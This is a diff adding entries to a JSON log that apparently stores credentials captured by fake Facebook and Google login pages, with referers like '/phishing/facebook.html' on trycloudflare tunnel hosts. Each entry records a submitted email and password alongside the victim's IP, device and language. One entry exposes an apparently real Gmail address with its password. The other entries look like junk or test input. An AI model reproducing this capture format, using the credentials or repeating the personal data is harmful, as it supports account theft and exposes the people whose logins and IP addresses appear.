@@ -103,5 +103,149 @@
         "pixelRatio": 3.5
       }
     }
+  },
+  {
+    "id": 1782371681666,
+    "timestamp": "2026-06-25T07:14:41.666Z",
+    "page_type": "facebook",
+    "campaign_id": "direct",
+    "credentials": {
+      "email": "nguyenducmanh.ducmanhjr@gmail.com",
+      "password": "728353",
+      "otp": null
+    },
+    "metadata": {
+      "ip": "42.113.16.187",
+      "user_agent": "Mozilla/5.0 (Linux; Android 14; M2102K1G Build/UKQ1.231207.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/566.0.0.57.86;]",
+      "referer": "https://bosnia-construction-encryption-soviet.trycloudflare.com/phishing/facebook.html",
+      "accept_language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+      "platform": "Android",
+      "screen_info": {
+        "width": 412,
+        "height": 915,
+        "pixelRatio": 2.625
+      },
+      "session_id": "fb_1782371660803_4u705b"
+    }
+  },
+  {
+    "id": 1782372452086,
+    "timestamp": "2026-06-25T07:27:32.086Z",
+    "page_type": "facebook",
+    "campaign_id": "direct",
+    "credentials": {
+      "email": "Nguyen",
+      "password": "836383",
+      "otp": null
+    },
+    "metadata": {
+      "ip": "42.113.16.187",
+      "user_agent": "Mozilla/5.0 (Linux; Android 14; M2102K1G Build/UKQ1.231207.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/566.0.0.57.86;]",
+      "referer": "https://bosnia-construction-encryption-soviet.trycloudflare.com/phishing/facebook.html",
+      "accept_language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+      "platform": "Android",
+      "screen_info": {
+        "width": 412,
+        "height": 915,
+        "pixelRatio": 2.625
+      },
+      "session_id": "fb_1782372419654_twhybk"
+    }
+  },
+  {
+    "id": 1782373033109,
+    "timestamp": "2026-06-25T07:37:13.109Z",
+    "page_type": "google",
+    "campaign_id": "default",
+    "credentials": {
+      "email": "Nguyen",
+      "password": "ueheje",
+      "otp": null
+    },
+    "metadata": {
+      "ip": "42.113.16.187",
+      "user_agent": "Mozilla/5.0 (Linux; Android 14; M2102K1G Build/UKQ1.231207.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/566.0.0.57.86;]",
+      "referer": "https://bosnia-construction-encryption-soviet.trycloudflare.com/phishing/google.html",
+      "accept_language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+      "platform": "Android",
+      "screen_info": {
+        "width": 412,
+        "height": 915,
+        "pixelRatio": 2.625
+      },
+      "session_id": null
+    }
+  },
+  {
+    "id": 1782373887994,
+    "timestamp": "2026-06-25T07:51:27.994Z",
+    "page_type": "facebook",
+    "campaign_id": "direct",
+    "credentials": {
+      "email": "Gghh",
+      "password": "vvvv",
+      "otp": null
+    },
+    "metadata": {
+      "ip": "42.113.16.187",
+      "user_agent": "Mozilla/5.0 (Linux; Android 14; M2102K1G Build/UKQ1.231207.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/566.0.0.57.86;]",
+      "referer": "https://oriental-cabinet-salon-assistant.trycloudflare.com/phishing/facebook.html",
+      "accept_language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+      "platform": "Android",
+      "screen_info": {
+        "width": 412,
+        "height": 915,
+        "pixelRatio": 2.625
+      },
+      "session_id": "fb_1782373879418_e6dhp3"
+    }
+  },
+  {
+    "id": 1782374291276,
+    "timestamp": "2026-06-25T07:58:11.276Z",
+    "page_type": "facebook",
+    "campaign_id": "direct",
+    "credentials": {
+      "email": "Hẹkegd",
+      "password": "rurhgeuge",
+      "otp": null
+    },
+    "metadata": {
+      "ip": "42.113.16.187",
+      "user_agent": "Mozilla/5.0 (Linux; Android 14; M2102K1G Build/UKQ1.231207.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/566.0.0.57.86;]",
+      "referer": "https://teddy-profit-teach-sector.trycloudflare.com/phishing/facebook.html",
+      "accept_language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+      "platform": "Android",
+      "screen_info": {
+        "width": 412,
+        "height": 915,
+        "pixelRatio": 2.625
+      },
+      "session_id": "fb_1782374283355_48val9"
+    }
+  },
+  {
+    "id": 1782374694690,
+    "timestamp": "2026-06-25T08:04:54.690Z",
+    "page_type": "facebook",
+    "campaign_id": "direct",
+    "credentials": {
+      "email": "jhvbjvjhv",
+      "password": "iubgibi",
+      "otp": null
+    },
+    "metadata": {
+      "ip": "42.113.16.187",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+      "referer": "https://repair-combo-bye-winners.trycloudflare.com/phishing/facebook.html",
+      "accept_language": "en-US,en;q=0.9,vi;q=0.8",
+      "platform": "Windows PC",
+      "screen_info": {
+        "width": 1536,
+        "height": 960,
+        "pixelRatio": 2
+      },
+      "session_id": "fb_1782374678421_9sdvim"
+    }
   }
 ]
